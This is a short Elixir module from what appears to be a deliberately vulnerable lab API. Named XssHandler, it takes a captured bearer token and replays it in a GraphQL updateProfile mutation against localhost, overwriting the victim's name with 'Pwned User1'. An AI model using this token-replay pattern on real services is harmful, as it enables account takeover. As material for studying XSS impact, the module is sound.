defmodule VulnerableApi.Utils.XssHandler do
  alias HTTP

  def exec(%{"token" => token}) do
    update_profile(token)
  end

  def exec(_), do: :ok

  defp update_profile(token) do
    headers = [{"Authorization", "Bearer #{token}"}, {"Content-Type", "application/json"}]

    document = """
      mutation updateProfile(
        $email: String!,
        $fullName: String!,
        $address: String!
      ) {
        updateProfile(
          email: $email,
          fullName: $fullName,
          address: $address
        ) {
          email
          fullName
          address
        }
      }
    """
    host = "localhost:4200/api/graphql"

    payload = %{
      query: document,
      variables: %{
        address: "Makati City",
        fullName: "Pwned User1"
      }
    }

    HTTPoison.post(host, Jason.encode!(payload), headers)
  end
end
